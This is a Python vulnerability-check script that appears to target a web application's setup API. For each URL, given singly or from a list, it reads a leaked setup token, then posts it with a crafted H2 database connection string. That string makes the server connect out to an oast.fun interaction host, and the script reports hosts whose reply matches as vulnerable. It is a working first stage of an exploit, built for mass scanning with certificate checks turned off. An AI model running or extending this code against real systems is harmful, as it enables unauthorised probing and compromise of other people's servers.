import requests
import json
import argparse
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def process_url(url):
    url = url.rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    response = requests.get(f"{url}/api/session/properties", verify=False)

    try:
        token = response.json().get('setup-token', 'Token not found')
    except json.JSONDecodeError:
        print(f"Failed to decode JSON from {url}")
        return

    if token == 'Token not found':
        print("Token not found")
        return
    else:
        print(f"[+] Token = {token}")

    json_data = {
        "token": token,
        "details": {
            "engine": "h2",
            "details": {
                "db": "tcp://ck1am7r2vtc0000757cggjoikryyyyyyb.oast.fun/test;ifexists=false\\;"
            }
        }
    }

    res = requests.post(f"{url}/api/setup/validate", json=json_data, verify=False)

    try:
        res_message = res.json().get('message', '')
    except json.JSONDecodeError:
        print(f"Failed to decode JSON from {url}")
        return

    if res_message == "Hmm, we couldn't connect to the database. Make sure your Host and Port settings are correct":
        print("[+] Vulnerable")
    else:
        print("[-] Not Vulnerable")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='Specify a single URL to process')
    parser.add_argument('--url-file', help='Specify a file containing a list of URLs to process')

    args = parser.parse_args()

    if args.url:
        process_url(args.url)

    if args.url_file:
        with open(args.url_file, 'r') as file:
            for url in file:
                url = url.strip()  # remove newline characters
                process_url(url)

if __name__ == "__main__":
    main()
